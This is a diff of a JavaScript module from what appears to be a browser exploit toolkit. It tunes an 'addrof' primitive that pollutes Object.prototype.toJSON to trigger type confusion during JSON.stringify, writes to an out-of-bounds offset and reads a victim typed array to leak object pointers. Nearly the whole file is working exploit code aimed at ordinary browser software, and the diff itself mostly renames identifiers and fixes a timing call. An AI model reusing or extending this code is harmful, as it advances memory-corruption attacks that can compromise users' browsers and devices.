@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v4_FocusOnConfusedThis)
+// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v4_FocusOnConfusedThis_FixError)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -9,24 +9,24 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT = "OriginalHeisenbug_TypedArrayAddrof_v4_FocusOnConfusedThis";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT_FE = "OriginalHeisenbug_TypedArrayAddrof_v4_FocusOnConfusedThis_FixError";
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
 
-let last_probe_call_details_v4fct = null; // fct for FocusOnConfusedThis
+let last_probe_call_details_v4fct = null; 
 let object_to_leak_A_v4fct = null;
 let object_to_leak_B_v4fct = null;
 let victim_typed_array_ref_v4fct = null;
 
 function toJSON_TA_Probe_FocusOnConfusedThis() {
     let current_call_details = {
-        probe_variant: "TA_Probe_Addrof_v4_FocusOnConfusedThis",
+        probe_variant: "TA_Probe_Addrof_v4_FocusOnConfusedThis_FixError",
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
         probe_called: true,
-        this_was_victim_ref_when_confused: null, // Renomeado para clareza
+        this_was_victim_ref_when_confused: null, 
         writes_attempted_on_confused_this: false
     };
 
@@ -65,18 +65,19 @@ function toJSON_TA_Probe_FocusOnConfusedThis() {
     
     last_probe_call_details_v4fct = { ...current_call_details }; 
 
-    return { minimal_probe_v4fct_did_execute: true }; 
+    return { minimal_probe_v4fct_fe_did_execute: true }; // fe for FixError
 }
 
-export async function executeTypedArrayVictimAddrofTest_FocusOnConfusedThis() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT}.triggerAndAddrof`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, FocusOnConfusedThis) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT} Init...`;
+export async function executeTypedArrayVictimAddrofTest_FocusOnConfusedThis_FixError() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT_FE}.triggerAndAddrof`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, FocusOnConfusedThis_FixError) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT_FE} Init...`;
 
     last_probe_call_details_v4fct = null;
     victim_typed_array_ref_v4fct = null;
-    object_to_leak_A_v4fct = { marker: "ObjA_TA_v4fct", id: Date.now() }; 
-    object_to_leak_B_v4fct = { marker: "ObjB_TA_v4fct", id: Date.now() + System.nanoTime() % 1000 };
+    object_to_leak_A_v4fct = { marker: "ObjA_TA_v4fct_fe", id: Date.now() }; 
+    // FIX: Replace System.nanoTime() with Math.random() for browser compatibility
+    object_to_leak_B_v4fct = { marker: "ObjB_TA_v4fct_fe", id: Date.now() + Math.floor(Math.random() * 1000) };
 
     let errorCapturedMain = null;
     let stringifyOutput = null;
@@ -133,7 +134,6 @@ export async function executeTypedArrayVictimAddrofTest_FocusOnConfusedThis() {
             }
             logS3(`  Captured last probe call details: ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
-            // Confirmação da Heisenbug baseada nos logs internos da sonda (mais confiável no momento)
             let heisenbugConfirmedByProbeInternals = false;
             if (captured_probe_details_after_stringify && 
                 captured_probe_details_after_stringify.probe_called &&
@@ -164,7 +164,7 @@ export async function executeTypedArrayVictimAddrofTest_FocusOnConfusedThis() {
                 (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                 logS3("  !!!! POTENTIAL POINTER READ at view[0] (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                 addrof_result_A.success = true;
-                addrof_result_A.message = "Heisenbug (FocusOnConfusedThis) observed & view[0] read suggests a pointer for ObjA.";
+                addrof_result_A.message = "Heisenbug (FocusOnConfusedThis_FixError) observed & view[0] read suggests a pointer for ObjA.";
             } else {
                 addrof_result_A.message = "View[0] read does not look like a pointer for ObjA or buffer was unchanged.";
                 if (heisenbugConfirmedByProbeInternals) addrof_result_A.message = "Heisenbug observed, but " + addrof_result_A.message;
@@ -181,7 +181,7 @@ export async function executeTypedArrayVictimAddrofTest_FocusOnConfusedThis() {
                 (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                 logS3("  !!!! POTENTIAL POINTER READ at view[1] (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                 addrof_result_B.success = true;
-                addrof_result_B.message = "Heisenbug (FocusOnConfusedThis) observed & view[1] read suggests a pointer for ObjB.";
+                addrof_result_B.message = "Heisenbug (FocusOnConfusedThis_FixError) observed & view[1] read suggests a pointer for ObjB.";
             } else {
                 addrof_result_B.message = "View[1] read does not look like a pointer for ObjB or buffer was unchanged.";
                  if (heisenbugConfirmedByProbeInternals) addrof_result_B.message = "Heisenbug observed, but " + addrof_result_B.message;
@@ -189,17 +189,17 @@ export async function executeTypedArrayVictimAddrofTest_FocusOnConfusedThis() {
             }
 
             if (addrof_result_A.success || addrof_result_B.success) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT}: Addr? SUCESSO!`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT_FE}: Addr? SUCESSO!`;
             } else if (heisenbugConfirmedByProbeInternals) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT}: Heisenbug OK, Addr Falhou`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT_FE}: Heisenbug OK, Addr Falhou`;
             } else {
-                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT}: Heisenbug Falhou?`;
+                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT_FE}: Heisenbug Falhou?`;
             }
 
         } catch (e_str) {
             errorCapturedMain = e_str;
             logS3(`    CRITICAL ERROR during JSON.stringify or addrof logic: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT}: Stringify/Addrof ERR`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT_FE}: Stringify/Addrof ERR`;
         } finally {
             if (pollutionApplied) {
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
@@ -211,7 +211,7 @@ export async function executeTypedArrayVictimAddrofTest_FocusOnConfusedThis() {
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
         logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT} CRITICALLY FAILED`;
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT_FE} CRITICALLY FAILED`;
     } finally {
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
